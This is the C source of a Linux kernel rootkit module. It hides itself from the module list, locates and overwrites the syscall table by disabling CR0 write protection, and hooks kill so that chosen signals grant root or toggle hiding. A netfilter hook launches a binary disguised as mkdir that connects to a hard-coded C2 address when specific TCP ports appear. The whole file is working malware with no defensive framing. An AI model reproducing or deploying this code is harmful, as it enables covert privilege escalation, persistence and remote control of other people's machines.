#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <asm/paravirt.h>
#include <linux/list.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#define START_MEM (unsigned long int)sys_close
#define END_MEM   ULONG_MAX 

#define ROOTSIGN 63 
#define HIDESIGN 62 

#define SPORT 1337
#define DPORT 1339

#define PACKAGE "/usr/local/bin/mkdir"
#define C2IP    "192.168.0.60"
#define C2PORT  "9090"

unsigned long cr0;
static int ishide = 1;
static unsigned long * __syscall_table;
static struct list_head *previous_mod;
typedef asmlinkage int (*orig_kill_t)(pid_t, int);
orig_kill_t orig_kill;
static struct nf_hook_ops nfho;

// http://www.drkns.net/kernel-who-does-magic/
static void shell_free_argv(struct subprocess_info * info){
  kfree(info->argv);
}

static int shell(void){
  struct subprocess_info * info;
  static char * envp[] = {
    "HOME=/",
    "TERM=linux", 
    "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 
    NULL
  };

  char ** argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);

  argv[0] = PACKAGE;
  argv[1] = C2IP;
  argv[2] = C2PORT;
  argv[3] = NULL;

  info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL,NULL, shell_free_argv, NULL);
  return call_usermodehelper_exec(info, UMH_WAIT_EXEC); 
}

//Code from https://stackoverflow.com/a/16532923
unsigned int hook_func(unsigned int hooknum, struct sk_buff * skb) {
  struct iphdr *ip_header;       // ip header struct
  struct tcphdr *tcp_header;     // tcp header struct
  struct sk_buff *sock_buff;

  unsigned int sport , dport;

  sock_buff = skb;

  if (!sock_buff)
    return NF_ACCEPT;

  ip_header = (struct iphdr *)skb_network_header(sock_buff);
  if (!ip_header)
    return NF_ACCEPT;

  if(ip_header->protocol==IPPROTO_TCP)
  {
    tcp_header= (struct tcphdr *)((__u32 *)ip_header+ ip_header->ihl);
    sport = htons((unsigned short int) tcp_header->source);
    dport = htons((unsigned short int) tcp_header->dest);
    if(sport == SPORT && dport == DPORT){
      shell();
    }
  }
  return NF_ACCEPT;
}

static int load_netfilter_hook(void){
  int result;

  nfho.hook       = (nf_hookfn *) hook_func;
  nfho.hooknum    = NF_INET_POST_ROUTING;
  nfho.pf         = PF_INET;
  nfho.priority   = NF_IP_PRI_FIRST;

  result = nf_register_hook(&nfho);

  return result;
}

// Find syscall table
unsigned long * get_syscall_table(void){
  unsigned long *syscall_table;
  unsigned long int i;
  for(i=START_MEM;i < END_MEM;i +=sizeof(void *)){
    syscall_table = (unsigned long *)i;
    if(syscall_table[__NR_close] == (unsigned long)sys_close) return syscall_table;
  } 
  return NULL;
}

static inline void disallow_memory_write(void){
  write_cr0(cr0);
}

static inline void allow_memory_write(void){
  write_cr0(cr0 & ~0x00010000);
}

static inline void hide_module(void){
  ishide = 1;
  previous_mod = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
}

static inline void unhide_module(void){
  ishide = 0;
  list_add(&THIS_MODULE->list, previous_mod);
}

static void rootmagic(void){
  struct cred *creds;
  creds = prepare_creds();
  if(creds == NULL){
    return;
  }
  creds->uid.val = creds->gid.val = 0;
  creds->euid.val = creds->egid.val = 0;
  creds->suid.val = creds->sgid.val = 0;
  creds->fsuid.val = creds->fsgid.val = 0;
  commit_creds(creds);
}

asmlinkage int hook_kill(pid_t pid, int sig){
  if (sig == ROOTSIGN){
    rootmagic();
  } else if(sig == HIDESIGN){
    if (ishide == 1){
      unhide_module();
    } else{
      hide_module();
    }
  }else{
    return orig_kill(pid,sig);
  }
  return 0;
} 

int __init giveme_root_init(void){
  hide_module();
  ;
  if( load_netfilter_hook()){
    return 1;
  }
  //Get syscall table
  __syscall_table = get_syscall_table();

  //Save original kill syscall
  orig_kill = (orig_kill_t)__syscall_table[__NR_kill];

  //Get cr0
  cr0 = read_cr0();

  //Change bit on cr0 to allow write
  allow_memory_write();

  //Change syscall kill to hook_kill
  __syscall_table[__NR_kill] = (unsigned long)hook_kill;

  //Change bit on cr0 to disallow write
  disallow_memory_write();
  return 0;
}

void __exit giveme_root_exit(void){
  nf_unregister_hook(&nfho);

  //Restore original kill syscall
  allow_memory_write();
  __syscall_table[__NR_kill] = (unsigned long)orig_kill;
  disallow_memory_write();
}

module_init(giveme_root_init);
module_exit(giveme_root_exit);

